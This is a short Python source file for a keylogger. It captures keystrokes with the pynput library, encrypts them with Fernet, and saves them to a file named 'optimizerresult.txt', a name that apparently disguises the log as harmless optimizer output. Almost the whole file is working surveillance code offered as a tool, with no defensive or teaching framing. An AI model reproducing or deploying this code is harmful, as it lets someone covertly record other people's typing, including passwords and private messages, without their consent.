import os
from cryptography.fernet import Fernet
from pynput import keyboard

# Generate or load the encryption key
def load_key():
    if os.path.exists("key.key"):
        with open("key.key", "rb") as key_file:
            key = key_file.read()
    else:
        key = Fernet.generate_key()
        with open("key.key", "wb") as key_file:
            key_file.write(key)
    return key

# Function to clear the contents of the text file
def clear_file():
    with open("optimizerresult.txt", "wb") as f:  # Use 'wb' to handle binary data
        f.write(b"")

# Clear the file at the beginning of each iteration
clear_file()

# Global variable to track keystrokes
logged_text = []

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char:
            logged_text.append(key.char)
        else:
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.esc: "<ESC>"
                # Add other special characters here if needed
            }
            if key in special_keys:
                logged_text.append(special_keys[key])
    except AttributeError:
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        confirm = input("Press 'Enter' again to exit. Press any other key to continue logging: ")
        if confirm == '':
            return False

# Generate or load the encryption key
key = load_key()
cipher = Fernet(key)

# Start the keylogger
print("Keylogger started. Press 'Esc' to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Encrypt the logged text
logged_text_str = "".join(logged_text)
encrypted_text = cipher.encrypt(logged_text_str.encode())

# Write encrypted text to file
with open("optimizerresult.txt", "wb") as f:  # Use 'wb' to handle binary data
    f.write(encrypted_text)
